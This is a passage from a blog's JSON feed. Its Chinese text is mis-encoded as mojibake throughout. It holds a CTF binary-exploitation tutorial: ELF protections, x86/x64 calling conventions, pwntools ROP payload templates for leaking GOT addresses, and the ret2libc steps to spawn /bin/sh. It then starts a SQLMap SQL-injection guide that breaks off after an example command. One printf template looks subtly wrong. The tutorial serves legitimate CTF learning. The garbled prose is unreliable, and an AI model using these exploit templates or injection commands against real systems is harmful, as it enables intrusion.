¼å¼ï¼Œå…¶æ¶æ„ä¿¡æ¯ç›´æ¥å½±å“æ¼æ´åˆ©ç”¨çš„ç­–ç•¥ã€‚ä»¥ä¸‹æ˜¯å…³é”®ç‚¹ï¼š</p>\n<ul>\n<li><strong>ç›®æ ‡ç¨‹åºæ¶æ„</strong>ï¼šæœ¬æ–‡ä»¥ <code>amd64-64-little</code>ï¼ˆ64 ä½å°ç«¯åºï¼‰ä¸ºä¾‹ã€‚</li>\n<li><strong>ä½œç”¨</strong>ï¼š<ul>\n<li><strong>å‡½æ•°è°ƒç”¨çº¦å®š</strong>ï¼šå†³å®šäº†å‚æ•°ä¼ é€’æ–¹å¼ï¼ˆå¦‚å¯„å­˜å™¨æˆ–æ ˆï¼‰ã€‚</li>\n<li><strong>ROP æ„é€ </strong>ï¼šéœ€è¦æ ¹æ®æ¶æ„é€‰æ‹©åˆé€‚çš„ gadgetã€‚</li>\n<li><strong>ç³»ç»Ÿè°ƒç”¨å·</strong>ï¼šä¸åŒæ¶æ„ä¸‹ç³»ç»Ÿè°ƒç”¨å·ï¼ˆå¦‚ <code>read</code>ã€<code>write</code>ï¼‰å­˜åœ¨å·®å¼‚ã€‚</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ä¿æŠ¤æœºåˆ¶æ€»è§ˆ\"><a href=\"#ä¿æŠ¤æœºåˆ¶æ€»è§ˆ\" class=\"headerlink\" title=\"ä¿æŠ¤æœºåˆ¶æ€»è§ˆ\"></a>ä¿æŠ¤æœºåˆ¶æ€»è§ˆ</h2><p>ELF æ–‡ä»¶é€šå¸¸å¯ç”¨å¤šç§ä¿æŠ¤æœºåˆ¶ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚ä»¥ä¸‹æ˜¯å¸¸è§ä¿æŠ¤æœºåˆ¶åŠå…¶åœ¨ PWNï¼ˆäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼‰ä¸­çš„ä½œç”¨ä¸ç»•è¿‡æ–¹å¼ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>ä¿æŠ¤é¡¹</th>\n<th>çŠ¶æ€</th>\n<th>è¯´æ˜</th>\n<th>åœ¨ PWN ä¸­çš„ä½œç”¨ä¸åˆ©ç”¨æ–¹å¼</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>RELRO</strong></td>\n<td>Partial RELRO</td>\n<td>GOT è¡¨éƒ¨åˆ†å—ä¿æŠ¤ï¼ŒGOT å¯å†™</td>\n<td>å¯é€šè¿‡ ret2got æ”¹å†™å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ <code>write</code> â†’ <code>system</code>ï¼‰</td>\n</tr>\n<tr>\n<td><strong>RELRO</strong></td>\n<td>Full RELRO</td>\n<td>GOT è¡¨å®Œå…¨ä¸å¯å†™</td>\n<td>æ— æ³•æ”¹å†™ GOTï¼Œåªèƒ½æ³„éœ² GOT åœ°å€åæ„é€  ROP</td>\n</tr>\n<tr>\n<td><strong>Stack Canary</strong></td>\n<td>No Canary Found</td>\n<td>æ ˆæ— æº¢å‡ºæ£€æµ‹</td>\n<td>å¯ç›´æ¥æ ˆæº¢å‡ºæ§åˆ¶è¿”å›åœ°å€</td>\n</tr>\n<tr>\n<td><strong>Stack Canary</strong></td>\n<td>Canary Found</td>\n<td>å¯ç”¨æ ˆæº¢å‡ºæ£€æµ‹æœºåˆ¶</td>\n<td>éœ€å…ˆæ³„éœ² Canary å€¼ï¼Œå¦åˆ™ç¨‹åºå´©æºƒ</td>\n</tr>\n<tr>\n<td><strong>NX</strong></td>\n<td>NX Enabled</td>\n<td>æ ˆä¸å¯æ‰§è¡Œ</td>\n<td>æ— æ³•æ‰§è¡Œ Shellcodeï¼Œéœ€ç”¨ ROP æˆ– ret2libc</td>\n</tr>\n<tr>\n<td><strong>PIE</strong></td>\n<td>No PIE (å›ºå®šåŸºå€ï¼Œå¦‚ 0x400000)</td>\n<td>ç¨‹åºåŸºå€å›ºå®š</td>\n<td>åœ°å€å¯é™æ€åˆ†æï¼ŒROP æ„é€ æ›´ç®€å•</td>\n</tr>\n<tr>\n<td><strong>PIE</strong></td>\n<td>PIE Enabled</td>\n<td>åŸºå€éšæœºåŒ–</td>\n<td>éœ€å…ˆæ³„éœ²æ¨¡å—åŸºå€ï¼ŒROP æ„é€ æ›´å¤æ‚</td>\n</tr>\n</tbody></table>\n<h3 id=\"CTF-å¸¸è§é¢˜å‹ä¸ä¿æŠ¤æœºåˆ¶\"><a href=\"#CTF-å¸¸è§é¢˜å‹ä¸ä¿æŠ¤æœºåˆ¶\" class=\"headerlink\" title=\"CTF å¸¸è§é¢˜å‹ä¸ä¿æŠ¤æœºåˆ¶\"></a>CTF å¸¸è§é¢˜å‹ä¸ä¿æŠ¤æœºåˆ¶</h3><p>ä¸åŒç±»å‹çš„ CTF é¢˜ç›®é€šå¸¸æ­é…ç‰¹å®šçš„ä¿æŠ¤æœºåˆ¶ï¼Œå½±å“åˆ©ç”¨æ–¹å¼ï¼š</p>\n<ul>\n<li><strong>ROP &#x2F; ret2libc é¢˜</strong>ï¼šé€šå¸¸æœ‰ NX ä¿æŠ¤ï¼Œæ—  PIE æˆ–ä»… Partial RELROï¼Œä¾¿äºæ„é€  ROP é“¾ã€‚</li>\n<li><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜</strong>ï¼šå¸¸æ­é… Full RELROï¼Œé™åˆ¶ GOT é‡å†™ï¼Œéœ€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²åœ°å€ã€‚</li>\n<li><strong>å †é¢˜</strong>ï¼šé€šå¸¸æœ‰ Stack Canaryï¼ŒæŒ‘æˆ˜åœ¨äºç»•è¿‡ Canary æˆ–åˆ©ç”¨å †æ¼æ´ã€‚</li>\n<li><strong>Shellcode ç±»é¢˜</strong>ï¼šä¸€èˆ¬æ—  NX ä¿æŠ¤ï¼Œå…è®¸åœ¨æ ˆä¸Šç›´æ¥æ‰§è¡Œæ³¨å…¥çš„ Shellcodeã€‚</li>\n</ul>\n<h2 id=\"å‡½æ•°åŸå‹ä¸è°ƒç”¨æ–¹å¼\"><a href=\"#å‡½æ•°åŸå‹ä¸è°ƒç”¨æ–¹å¼\" class=\"headerlink\" title=\"å‡½æ•°åŸå‹ä¸è°ƒç”¨æ–¹å¼\"></a>å‡½æ•°åŸå‹ä¸è°ƒç”¨æ–¹å¼</h2><h3 id=\"å¸¸ç”¨å‡½æ•°åŸå‹\"><a href=\"#å¸¸ç”¨å‡½æ•°åŸå‹\" class=\"headerlink\" title=\"å¸¸ç”¨å‡½æ•°åŸå‹\"></a>å¸¸ç”¨å‡½æ•°åŸå‹</h3><p>ä»¥ä¸‹æ˜¯ PWN ä¸­å¸¸ç”¨çš„æ ‡å‡†åº“å‡½æ•°åŠå…¶å‚æ•°è¯´æ˜ï¼š</p>\n<ol>\n<li><p><strong><code>ssize_t write(int fd, const void *buf, size_t count);</code></strong></p>\n<ul>\n<li><code>fd</code>ï¼šæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¦‚ <code>1</code> è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼‰ã€‚</li>\n<li><code>buf</code>ï¼šå¾…è¾“å‡ºæ•°æ®çš„èµ·å§‹åœ°å€ï¼Œå¯ç”¨äºæ³„éœ²å†…å­˜å†…å®¹ã€‚</li>\n<li><code>count</code>ï¼šè¾“å‡ºå­—èŠ‚æ•°ï¼Œéœ€æ§åˆ¶ä»¥é¿å…æ³„éœ²è¿‡å¤šæ•°æ®ã€‚</li>\n</ul>\n</li>\n<li><p><strong><code>ssize_t read(int fd, void *buf, size_t count);</code></strong></p>\n<ul>\n<li><code>fd</code>ï¼šæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¦‚ <code>0</code> è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼‰ã€‚</li>\n<li><code>buf</code>ï¼šå†™å…¥æ•°æ®çš„ç›®æ ‡åœ°å€ï¼ˆå¦‚æ ˆã€å †æˆ– BSS æ®µï¼‰ã€‚</li>\n<li><code>count</code>ï¼šè¯»å–å­—èŠ‚æ•°ï¼Œå¯ç”¨äºè§¦å‘æº¢å‡ºæˆ–å¸ƒç½® ROP é“¾ã€‚</li>\n</ul>\n</li>\n<li><p><strong><code>int puts(const char *s);</code></strong></p>\n<ul>\n<li><code>s</code>ï¼šå­—ç¬¦ä¸²èµ·å§‹åœ°å€ï¼Œé‡ <code>\\x00</code> ç»ˆæ­¢ã€‚</li>\n<li>å¸¸ç”¨äºæ³„éœ² GOT è¡¨ä¸­çš„å‡½æ•°åœ°å€ï¼ˆå¦‚ <code>puts(puts_got)</code>ï¼‰ã€‚</li>\n</ul>\n</li>\n<li><p><strong><code>int printf(const char *format, ...);</code></strong></p>\n<ul>\n<li><code>format</code>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</li>\n<li>å¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²ä»»æ„åœ°å€å†…å®¹ã€‚</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"å‚æ•°ä¼ é€’æ–¹å¼å¯¹æ¯”\"><a href=\"#å‚æ•°ä¼ é€’æ–¹å¼å¯¹æ¯”\" class=\"headerlink\" title=\"å‚æ•°ä¼ é€’æ–¹å¼å¯¹æ¯”\"></a>å‚æ•°ä¼ é€’æ–¹å¼å¯¹æ¯”</h3><table>\n<thead>\n<tr>\n<th>æ¶æ„</th>\n<th>å‚æ•°ä¼ é€’æ–¹å¼</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>32 ä½ (x86)</strong></td>\n<td>æ‰€æœ‰å‚æ•°é€šè¿‡æ ˆä»å³å‘å·¦å‹å…¥</td>\n</tr>\n<tr>\n<td><strong>64 ä½ (x86_64)</strong></td>\n<td>å‰ 6 ä¸ªå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼š<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code></td>\n</tr>\n</tbody></table>\n<p><strong>æç¤º</strong>ï¼šåœ¨ 64 ä½ ROP æ„é€ ä¸­ï¼Œå¸¸ç”¨ gadget åŒ…æ‹¬ï¼š</p>\n<ul>\n<li><code>pop rdi; ret</code></li>\n<li><code>pop rsi; pop r15; ret</code></li>\n<li><code>pop rdx; ret</code></li>\n</ul>\n<h3 id=\"ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscallï¼‰\"><a href=\"#ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscallï¼‰\" class=\"headerlink\" title=\"ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscallï¼‰\"></a>ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscallï¼‰</h3><p>ç³»ç»Ÿè°ƒç”¨å·å› æ¶æ„ä¸åŒè€Œå¼‚ï¼Œå¸¸ç”¨å‡½æ•°çš„è°ƒç”¨å·å¦‚ä¸‹ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>å‡½æ•°</th>\n<th>x86 (32 ä½)</th>\n<th>x86_64 (64 ä½)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>read</code></td>\n<td>3</td>\n<td>0</td>\n</tr>\n<tr>\n<td><code>write</code></td>\n<td>4</td>\n<td>1</td>\n</tr>\n<tr>\n<td><code>execve</code></td>\n<td>11</td>\n<td>59</td>\n</tr>\n</tbody></table>\n<ul>\n<li><strong>x86</strong>ï¼šä½¿ç”¨ <code>int 0x80</code> è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚</li>\n<li><strong>x86_64</strong>ï¼šä½¿ç”¨ <code>syscall</code> æŒ‡ä»¤ï¼Œé€šè¿‡è®¾ç½® <code>rax</code> å¯„å­˜å™¨æ§åˆ¶ç³»ç»Ÿè°ƒç”¨ç±»å‹ã€‚</li>\n</ul>\n<h2 id=\"å¸¸è§å‡½æ•°-ROP-æ„é€ \"><a href=\"#å¸¸è§å‡½æ•°-ROP-æ„é€ \" class=\"headerlink\" title=\"å¸¸è§å‡½æ•° ROP æ„é€ \"></a>å¸¸è§å‡½æ•° ROP æ„é€ </h2><p>ä»¥ä¸‹å±•ç¤ºå¦‚ä½•é’ˆå¯¹å¸¸ç”¨å‡½æ•°æ„é€  ROP é“¾ï¼Œåˆ†åˆ«ä»¥ 32 ä½å’Œ 64 ä½æ¶æ„ä¸ºä¾‹ã€‚å‡è®¾ä½¿ç”¨ <code>pwntools</code> çš„ <code>flat</code> å‡½æ•°æ¥æ„é€  payloadã€‚</p>\n<h3 id=\"write-å‡½æ•°\"><a href=\"#write-å‡½æ•°\" class=\"headerlink\" title=\"write å‡½æ•°\"></a>write å‡½æ•°</h3><ul>\n<li><strong>32 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    <span class=\"hljs-string\">b&#x27;A&#x27;</span> * offset,  <span class=\"hljs-comment\"># å¡«å……è‡³è¿”å›åœ°å€</span><br>    write_plt,      <span class=\"hljs-comment\"># write å‡½æ•° PLT åœ°å€</span><br>    main_addr,      <span class=\"hljs-comment\"># è¿”å›åœ°å€ï¼ˆé€šå¸¸å›åˆ° mainï¼‰</span><br>    <span class=\"hljs-number\">1</span>,              <span class=\"hljs-comment\"># fd = stdout</span><br>    write_got,      <span class=\"hljs-comment\"># buf = GOT åœ°å€ï¼Œç”¨äºæ³„éœ²</span><br>    <span class=\"hljs-number\">4</span>               <span class=\"hljs-comment\"># count = 4 å­—èŠ‚</span><br>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>64 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    pop_rdi, <span class=\"hljs-number\">1</span>,         <span class=\"hljs-comment\"># RDI = 1 (stdout)</span><br>    pop_rsi_r15, write_got, <span class=\"hljs-number\">0</span>,  <span class=\"hljs-comment\"># RSI = GOT åœ°å€</span><br>    pop_rdx, <span class=\"hljs-number\">8</span>,         <span class=\"hljs-comment\"># RDX = 8 å­—èŠ‚</span><br>    write_plt           <span class=\"hljs-comment\"># è°ƒç”¨ write</span><br>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"read-å‡½æ•°\"><a href=\"#read-å‡½æ•°\" class=\"headerlink\" title=\"read å‡½æ•°\"></a>read å‡½æ•°</h3><ul>\n<li><strong>32 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    <span class=\"hljs-string\">b&#x27;A&#x27;</span> * offset,  <span class=\"hljs-comment\"># å¡«å……è‡³è¿”å›åœ°å€</span><br>    read_plt,       <span class=\"hljs-comment\"># read å‡½æ•° PLT åœ°å€</span><br>    ret_addr,       <span class=\"hljs-comment\"># è¿”å›åœ°å€</span><br>    <span class=\"hljs-number\">0</span>,              <span class=\"hljs-comment\"># fd = stdin</span><br>    buf_addr,       <span class=\"hljs-comment\"># ç›®æ ‡åœ°å€ï¼ˆå¦‚ BSS æ®µï¼‰</span><br>    <span class=\"hljs-number\">100</span>             <span class=\"hljs-comment\"># count = 100 å­—èŠ‚</span><br>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>64 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    pop_rdi, <span class=\"hljs-number\">0</span>,         <span class=\"hljs-comment\"># RDI = 0 (stdin)</span><br>    pop_rsi_r15, buf_addr, <span class=\"hljs-number\">0</span>,  <span class=\"hljs-comment\"># RSI = ç›®æ ‡åœ°å€</span><br>    pop_rdx, <span class=\"hljs-number\">100</span>,       <span class=\"hljs-comment\"># RDX = 100 å­—èŠ‚</span><br>    read_plt,           <span class=\"hljs-comment\"># è°ƒç”¨ read</span><br>    main_addr           <span class=\"hljs-comment\"># è¿”å› main</span><br>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"puts-å‡½æ•°\"><a href=\"#puts-å‡½æ•°\" class=\"headerlink\" title=\"puts å‡½æ•°\"></a>puts å‡½æ•°</h3><ul>\n<li><strong>32 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    <span class=\"hljs-string\">b&#x27;A&#x27;</span> * offset,  <span class=\"hljs-comment\"># å¡«å……è‡³è¿”å›åœ°å€</span><br>    puts_plt,       <span class=\"hljs-comment\"># puts å‡½æ•° PLT åœ°å€</span><br>    main_addr,      <span class=\"hljs-comment\"># è¿”å›åœ°å€</span><br>    puts_got        <span class=\"hljs-comment\"># å‚æ•°ï¼šputs GOT åœ°å€</span><br>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>64 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    pop_rdi, puts_got,  <span class=\"hljs-comment\"># RDI = puts GOT åœ°å€</span><br>    puts_plt,           <span class=\"hljs-comment\"># è°ƒç”¨ puts</span><br>    main_addr           <span class=\"hljs-comment\"># è¿”å› main</span><br>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"printf-å‡½æ•°ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ï¼‰\"><a href=\"#printf-å‡½æ•°ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ï¼‰\" class=\"headerlink\" title=\"printf å‡½æ•°ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ï¼‰\"></a>printf å‡½æ•°ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ï¼‰</h3><ul>\n<li><strong>32 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    <span class=\"hljs-string\">b&#x27;A&#x27;</span> * offset,  <span class=\"hljs-comment\"># å¡«å……è‡³è¿”å›åœ°å€</span><br>    printf_plt,     <span class=\"hljs-comment\"># printf å‡½æ•° PLT åœ°å€</span><br>    main_addr,      <span class=\"hljs-comment\"># è¿”å›åœ°å€</span><br>    got_puts        <span class=\"hljs-comment\"># å‚æ•°ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå¦‚ &quot;%s&quot;ï¼‰</span><br>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>64 ä½æ„é€ </strong>ï¼š</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = flat(<br>    pop_rdi, format_str,    <span class=\"hljs-comment\"># RDI = æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€</span><br>    pop_rsi_r15, got_read, <span class=\"hljs-number\">0</span>,  <span class=\"hljs-comment\"># RSI = ç›®æ ‡åœ°å€</span><br>    printf_plt,             <span class=\"hljs-comment\"># è°ƒç”¨ printf</span><br>    main_addr               <span class=\"hljs-comment\"># è¿”å› main</span><br>)<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"ret2libc-åˆ©ç”¨æµç¨‹\"><a href=\"#ret2libc-åˆ©ç”¨æµç¨‹\" class=\"headerlink\" title=\"ret2libc åˆ©ç”¨æµç¨‹\"></a>ret2libc åˆ©ç”¨æµç¨‹</h2><p><code>ret2libc</code> æ˜¯ä¸€ç§ç»å…¸çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç»•è¿‡ NX ä¿æŠ¤ï¼Œé€šè¿‡è°ƒç”¨ libc ä¸­çš„å‡½æ•°ï¼ˆå¦‚ <code>system(&quot;/bin/sh&quot;)</code>ï¼‰è·å– shellã€‚ä»¥ä¸‹æ˜¯å¸¸è§„æµç¨‹ï¼š</p>\n<ol>\n<li><strong>æ³„éœ² GOT è¡¨åœ°å€</strong>ï¼šåˆ©ç”¨ <code>puts</code> æˆ– <code>write</code> æ³„éœ² <code>puts@got</code> çš„çœŸå®åœ°å€ã€‚</li>\n<li><strong>è®¡ç®— libc åŸºå€</strong>ï¼šé€šè¿‡æ¥æ”¶åˆ°çš„åœ°å€ï¼Œç»“åˆ libc çš„åç§»é‡ï¼Œè®¡ç®— libc åŸºå€ã€‚</li>\n<li><strong>è·å–å…³é”®å‡½æ•°åœ°å€</strong>ï¼šåˆ©ç”¨ libc åŸºå€å’Œåç§»ï¼Œå¾—åˆ° <code>system</code> å’Œ <code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ã€‚</li>\n<li><strong>æ„é€  ROP é“¾</strong>ï¼šè°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> æ‰§è¡Œ shellã€‚</li>\n</ol>\n<h2 id=\"ROP-æ±‡æ€»å¯¹æ¯”è¡¨\"><a href=\"#ROP-æ±‡æ€»å¯¹æ¯”è¡¨\" class=\"headerlink\" title=\"ROP æ±‡æ€»å¯¹æ¯”è¡¨\"></a>ROP æ±‡æ€»å¯¹æ¯”è¡¨</h2><table>\n<thead>\n<tr>\n<th>å‡½æ•°</th>\n<th>æ¶æ„</th>\n<th>å‚æ•°æ–¹å¼</th>\n<th>æ„é€ è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>write</td>\n<td>32 ä½</td>\n<td>æ ˆä¸Šä¼ å‚</td>\n<td><code>fd=1, buf=got, count=4</code></td>\n</tr>\n<tr>\n<td>write</td>\n<td>64 ä½</td>\n<td>RDI, RSI, RDX</td>\n<td>ROP æ§åˆ¶ 3 ä¸ªå¯„å­˜å™¨åè°ƒç”¨</td>\n</tr>\n<tr>\n<td>read</td>\n<td>32 ä½</td>\n<td>æ ˆä¸Šä¼ å‚</td>\n<td>ç”¨äºæ ˆè¿ç§»æˆ–æ³¨å…¥åç»­ ROP é“¾</td>\n</tr>\n<tr>\n<td>read</td>\n<td>64 ä½</td>\n<td>RDI, RSI, RDX</td>\n<td>å¸¸ä¸ <code>leave_ret</code> gadget æ­é…ä½¿ç”¨</td>\n</tr>\n<tr>\n<td>puts</td>\n<td>32 ä½</td>\n<td>æ ˆä¸Šä¼ å‚</td>\n<td>è°ƒç”¨ <code>puts(got_xxx)</code> æ³„éœ²åœ°å€</td>\n</tr>\n<tr>\n<td>puts</td>\n<td>64 ä½</td>\n<td>RDI -&gt; GOT åœ°å€</td>\n<td><code>pop rdi; call puts</code></td>\n</tr>\n<tr>\n<td>printf</td>\n<td>32 ä½</td>\n<td>æ ˆä¸Šä¼ å‚</td>\n<td><code>printf(fmt, val)</code> ç”¨äºæ ¼å¼åŒ–æ³„éœ²</td>\n</tr>\n<tr>\n<td>printf</td>\n<td>64 ä½</td>\n<td>RDI, RSI</td>\n<td>RDI æŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒRSI æŒ‡å‘åœ°å€</td>\n</tr>\n</tbody></table>\n<h2 id=\"å®ç”¨å·¥å…·æç¤º\"><a href=\"#å®ç”¨å·¥å…·æç¤º\" class=\"headerlink\" title=\"å®ç”¨å·¥å…·æç¤º\"></a>å®ç”¨å·¥å…·æç¤º</h2><ul>\n<li><strong>ROPgadget</strong>ï¼šç”¨äºæŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ gadgetï¼Œä¾‹å¦‚ï¼š<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ROPgadget --binary a.out --only <span class=\"hljs-string\">&#x27;pop|ret&#x27;</span><br></code></pre></td></tr></table></figure></li>\n<li><strong>pwndbg</strong>ï¼šGDB æ’ä»¶ï¼Œæ–¹ä¾¿è°ƒè¯•å’ŒæŸ¥æ‰¾ gadgetã€‚</li>\n<li><strong>pwntools</strong>ï¼šPython åº“ï¼Œç®€åŒ– ROP é“¾æ„é€ å’Œ payload ç”Ÿæˆã€‚</li>\n</ul>\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>ELF æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶å’Œæ¶æ„ç‰¹æ€§ç›´æ¥å½±å“æ¼æ´åˆ©ç”¨çš„éš¾åº¦å’Œæ–¹å¼ã€‚ç†è§£ RELROã€Canaryã€NX å’Œ PIE ç­‰ä¿æŠ¤æœºåˆ¶çš„ä½œç”¨ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡ ROP å’Œ ret2libc æŠ€æœ¯ç»•è¿‡è¿™äº›ä¿æŠ¤ï¼Œæ˜¯ CTF å’ŒäºŒè¿›åˆ¶å®‰å…¨ç ”ç©¶çš„æ ¸å¿ƒæŠ€èƒ½ã€‚å¸Œæœ›æœ¬æ–‡çš„åˆ†æå’Œç¤ºä¾‹ä»£ç èƒ½ä¸ºä½ çš„ PWN å­¦ä¹ æä¾›å¸®åŠ©ï¼</p>\n",
            "tags": [
                "PWN",
                "ELF",
                "ROP",
                "CTF",
                "äºŒè¿›åˆ¶å®‰å…¨"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/",
            "url": "https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/",
            "title": "SQLMap è‡ªåŠ¨åŒ– SQL æ³¨å…¥å·¥å…·",
            "date_published": "2025-07-21T11:33:02.000Z",
            "content_html": "<h2 id=\"SQLMap-è‡ªåŠ¨åŒ–-SQL-æ³¨å…¥å·¥å…·\"><a href=\"#SQLMap-è‡ªåŠ¨åŒ–-SQL-æ³¨å…¥å·¥å…·\" class=\"headerlink\" title=\"SQLMap è‡ªåŠ¨åŒ– SQL æ³¨å…¥å·¥å…·\"></a>SQLMap è‡ªåŠ¨åŒ– SQL æ³¨å…¥å·¥å…·</h2><h2 id=\"ä¸€ã€ğŸ”-æ ¸å¿ƒåŠŸèƒ½ä¸å‘½ä»¤é€‰é¡¹\"><a href=\"#ä¸€ã€ğŸ”-æ ¸å¿ƒåŠŸèƒ½ä¸å‘½ä»¤é€‰é¡¹\" class=\"headerlink\" title=\"ä¸€ã€ğŸ” æ ¸å¿ƒåŠŸèƒ½ä¸å‘½ä»¤é€‰é¡¹\"></a>ä¸€ã€ğŸ” æ ¸å¿ƒåŠŸèƒ½ä¸å‘½ä»¤é€‰é¡¹</h2><h3 id=\"ï¼ˆä¸€ï¼‰åŸºç¡€æ£€æµ‹ç±»-ğŸ§ª\"><a href=\"#ï¼ˆä¸€ï¼‰åŸºç¡€æ£€æµ‹ç±»-ğŸ§ª\" class=\"headerlink\" title=\"ï¼ˆä¸€ï¼‰åŸºç¡€æ£€æµ‹ç±» ğŸ§ª\"></a>ï¼ˆä¸€ï¼‰åŸºç¡€æ£€æµ‹ç±» ğŸ§ª</h3><table>\n<thead>\n<tr>\n<th>ä»»åŠ¡åˆ†ç±»</th>\n<th>å‘½ä»¤é€‰é¡¹</th>\n<th>è¯´æ˜</th>\n<th>ç¤ºä¾‹å‘½ä»¤</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>æ£€æµ‹æ³¨å…¥ç‚¹</td>\n<td><code>-u &lt;url&gt;</code></td>\n<td>æŒ‡å®šç›®æ ‡ URL</td>\n<td><code>sqlmap -u &quot;http://x.com/index.php?id=1&quot; --batch</code></td>\n</tr>\n<tr>\n<td>POST 